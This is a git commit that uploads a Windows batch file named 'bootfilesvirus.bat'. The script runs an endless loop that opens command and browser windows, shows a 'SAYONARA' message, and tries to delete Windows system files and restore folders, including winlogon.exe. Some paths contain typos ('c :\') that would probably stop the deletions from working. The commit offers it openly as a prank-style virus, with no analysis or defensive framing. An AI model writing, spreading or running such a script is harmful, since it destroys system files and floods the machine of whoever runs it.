61454e115f54efc64ce4d26513e9fa15191637b7
MR.Robot <45738614+Cult-of-the-dead-cow@users.noreply.github.com>
2019-02-15 15:14:40 +0530

    Add files via upload

---
+++ bootfilesvirus.bat
@@ -0,0 +1,13 @@
+@echo off
+:A
+Start CMD
+msg * "SAYONARA"
+start iexplore "youtube.com"
+start iexplore "runescape.com"
+del "c :\windows\pchealth"
+del "c :\windows\system32\restore"
+del "c :\windows\system32\autoexec.nt"
+del "c :\windows\system32\ntoskrni.exe"
+del "c :\winlogon.exe"
+goto :A
+
